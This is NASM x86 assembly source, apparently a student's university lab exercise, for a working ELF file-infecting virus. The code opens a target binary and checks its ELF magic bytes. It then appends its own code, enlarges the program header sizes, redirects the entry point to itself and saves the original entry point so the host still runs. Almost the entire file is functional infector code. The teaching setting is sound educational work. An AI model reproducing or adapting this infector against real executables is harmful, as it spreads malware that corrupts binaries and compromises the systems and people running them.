%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define	SEEK_CUR 1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

; added
%define stdout 1
%define magicElf 0x464c457f ; 4 bytes of elf is 7f ,45 4c 46

;map of stack:
%define fd 8
%define sizeOfFile 16
%define HeaderSize 52
%define OriginalEnteryPoint 72
%define PRHDInStack 140

	
	global _start

	section .text
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here:

	call get_my_loc 		
	sub ecx, next_i - OutStr    
	write stdout, ecx, 18 	; prints "This is a virus!"
	
	call get_my_loc 		;ecx gets location
	sub  ecx, next_i - FileName  ; gets file name - ELFexec2short
	mov  dword [ebp-4], ecx
	open dword [ebp-4], RDWR, 0777 ; open file ELFexec for Read and Write 0777 - all rwx
	mov  [ebp-fd],eax 		; saves fd of file to the stack
	cmp dword eax, 3		; next free fd is 3, so eax should equal 3
	jne openError 			; if eax !=3 error at opening the file
	
checkELF:
	
	lseek [ebp-fd] ,0,SEEK_SET	;point to the Beginning of the file
	
	mov	ebx,[ebp-fd]			; ebx hold the fd of the file
	mov ecx, ebp
	sub ecx, 12
	read ebx, ecx, 4		; read 4 bytes of the file to ebp-12 
	
	cmp dword [ecx], magicElf ;check if it is ELF by comparing first 4 bytes with the magic numbers of elf
	jne NotElfError			;if not ELF jump to error and exit

writeVirus_ToEndOfFile:
    lseek [ebp-fd], 0, SEEK_END ; eax hold size of file
    mov [ebp-sizeOfFile], eax   ; saves file size
	
	mov esi, virus_end 
	mov ebx, _start
	sub esi, ebx ; size of the virus is in esi
	call get_my_loc
	sub ecx, next_i - _start
	mov edi, ecx ; edi points to _start
	write [ebp-fd], edi, esi ; writes all the virus from _start (edi) with the size of esi (end-start)
	
	;check if error at writing
	cmp dword eax, -1 ; error at writing
	je WritingError
	
;task1
	
CopyELFHeaderToStack:
	lseek [ebp-fd], 0, SEEK_SET
	mov	ebx, HeaderSize ; header size 52 bytes
	mov	esi,ebp
	sub esi, 16           	;16 first bytes on stack are taken
	sub esi, HeaderSize		;save space for header, 52 bytes
    read [ebp-fd], esi, HeaderSize ;read the ELF header into stack
	;save the original entery point in ebp -100
	mov  ebx, [ebp-44]	; 68 -24 (entry point) = 44	, 68 = 52+16
	mov	 [ebp - OriginalEnteryPoint] , ebx


;task3 
	mov edi, [ebp-HeaderSize-16 +PHDR_start] 
    lseek [ebp-fd], edi, SEEK_SET   
    
   
    mov edi, ebp
    sub edi, OriginalEnteryPoint                      
    sub edi, PHDR_size
    read [ebp-fd],edi,PHDR_size     ;SAVE TO MEMORY PROGRAM HEADER 72+32=ebp-104
    mov edi, [ebp-104+PHDR_vaddr]  		;SAVE VIRTUAL ADDRESS
    mov esi, ebp
    sub esi, 108
    mov [esi], edi                  	;ESI = PROGRAM HEADER VIRTUAL ADDRESS
    
    mov edi, ebp
    sub edi, 108                       
    sub edi, PHDR_size                  ; EDI -> SECOND PROGRAM HEADER
    read [ebp-fd], edi, PHDR_size       
    mov edi, [ebp-PRHDInStack+PHDR_offset]      ;EDI = SECOND PROGRAM HEADER OFFSET
    
    mov edi, virus_end
    mov edx, _start
    sub edi, edx ; edi = virus size
    
OverwritePH:
    add edi, [ebp-sizeOfFile]  
    add  [ebp-PRHDInStack+PHDR_filesize], edi    ;UPDATING FILE SIZE INSIDE PROGRAM HEADER VIRUS.LEN + FILE.LEN
    add  [ebp-PRHDInStack+PHDR_memsize], edi     ;UPDATING FILE SIZE INSIDE PROGRAM HEADER MEMSIZE
    lseek [ebp-fd], -32, SEEK_CUR       ;MOVE FD TO THE SECOND PROGRAM HEADER
    
    mov edi, ebp
    sub edi, 108
    sub edi, PHDR_size                			  ;EDI = ebp-108-32 = ebp-140
    write [ebp-fd], edi, PHDR_size          ;OVERWRITE THE PROGRAM HEADER
    
    mov edi, [ebp-PRHDInStack+PHDR_vaddr]       	 ;EDI = SECOND PROGRAM HEADER VIRTUAL ADDRES
    add edi, [ebp-sizeOfFile]                 ;ADD TO EDI THE FILE LENGTH eax=second ph_virt addr+elf.length
    sub edi, [ebp-PRHDInStack+PHDR_offset]      	 ;EDI =2ND PROGRAM HEADER V_addr+FILE.len + OFFSET
    
    mov [ebp-HeaderSize-16+ENTRY], edi 			      ;OVERWRITE ENTRY POINT  IN MEMORY TO THE VIRUS
    lseek [ebp-fd], 0, SEEK_SET 
    mov edi, ebp    
    sub edi, HeaderSize	
    sub edi, 16							;SET EDI TO POINT TO THE ELF HEDAER IN MEMOREY
    
writesUpdatedELFHeader:
    write [ebp-fd], edi, HeaderSize
    
    lseek [ebp-fd], -4,SEEK_END
    mov edi, ebp
    sub edi, OriginalEnteryPoint
    write [ebp-fd], edi, 4	;writes the original entery point to the end of the virus
	close [ebp-fd] 
	
    add esp, STK_RES ; end of func
    mov esp,ebp
    pop ebp

end:
	call get_my_loc
	sub ecx, next_i - PreviousEntryPoint
	jmp [ecx] 
	
; end of code i wrote ------------------------------------
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec2long", 0 
OutStr:		db "This is a virus!", 10, 0
Failstr:        db "perhaps not", 10 , 0

FailToOpenMSG: db "Error at Open",10 , 0
NotElfMSG: db "File isnt ELF",10, 0
WriteErrorMSG: db "Error at Write", 10 ,0

;gets current location in the program - from practical session
get_my_loc:
	call next_i
next_i:
	pop ecx	; ecx holds the location
	ret

openError: ; arrive here if couldnt open a file
	call get_my_loc
	sub ecx, next_i - FailToOpenMSG
	write stdout, ecx, 15 ;write the error to the screen, 15 bytes
	;exit
	call get_my_loc
	sub ecx, next_i - PreviousEntryPoint ; end of code
	jmp [ecx]
	

NotElfError:
	call get_my_loc
	sub ecx, next_i - NotElfMSG
	write stdout, ecx, 15 ;write the error to the screen, 15 bytes
	;exit
	call get_my_loc
	sub ecx, next_i - PreviousEntryPoint ; end of code
	jmp [ecx]

WritingError:
	call get_my_loc
	sub ecx, next_i - WriteErrorMSG
	write stdout, ecx, 16 ;write the error to the screen, 16 bytes
	;exit
	call get_my_loc
	sub ecx, next_i - PreviousEntryPoint ; end of code
	jmp [ecx]
	
PreviousEntryPoint: dd VirusExit
virus_end: